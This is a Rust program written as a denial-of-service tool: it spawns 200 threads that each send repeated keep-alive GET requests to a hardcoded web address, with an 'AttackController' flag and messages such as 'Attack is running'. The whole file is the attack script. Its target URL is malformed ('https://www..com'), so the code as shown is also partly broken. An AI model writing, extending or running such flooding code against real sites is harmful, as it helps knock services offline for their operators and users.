use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use reqwest::Client;
use reqwest::header::{HeaderMap, HeaderValue, CONNECTION, ACCEPT_LANGUAGE, USER_AGENT};

#[tokio::main]
async fn main() {
    let url = "https://www..com"; // Corrected URL
    let input = 200; // Number of sockets

    let attack_controller = Arc::new(Mutex::new(AttackController::new()));

    let mut handles = Vec::new();

    for _ in 0..input {
        let attack_controller_clone = Arc::clone(&attack_controller);

        let handle = thread::spawn(move || {
            tokio::runtime::Runtime::new().unwrap().block_on(async {
                let client = Client::new();

                loop {
                    let is_attacking = attack_controller_clone.lock().unwrap().is_attacking;

                    if !is_attacking {
                        println!("Attack is stopped.");
                        break;
                    }

                    let mut headers = HeaderMap::new();
                    headers.insert(ACCEPT_LANGUAGE, HeaderValue::from_static("en-US,en;q=0.5"));
                    headers.insert(CONNECTION, HeaderValue::from_static("Keep-Alive"));
                    headers.insert(USER_AGENT, HeaderValue::from_static("Your User-Agent"));

                    match client.get(url).headers(headers).send().await {
                        Ok(response) => {
                            if response.status().is_success() {
                                println!("Request successful");
                            } else {
                                println!("Request failed with status: {}", response.status());
                            }
                        }
                        Err(err) => {
                            println!("Request error: {}", err);
                        }
                    }

                    tokio::time::sleep(Duration::from_secs(1)).await;
                }
            });
        });

        handles.push(handle);
    }

    // Attack is running
    for handle in handles {
        handle.join().unwrap();
    }

    println!("Attack stopped.");
}

struct AttackController {
    is_attacking: bool,
}

impl AttackController {
    fn new() -> Self {
        AttackController { is_attacking: true }
    }
}
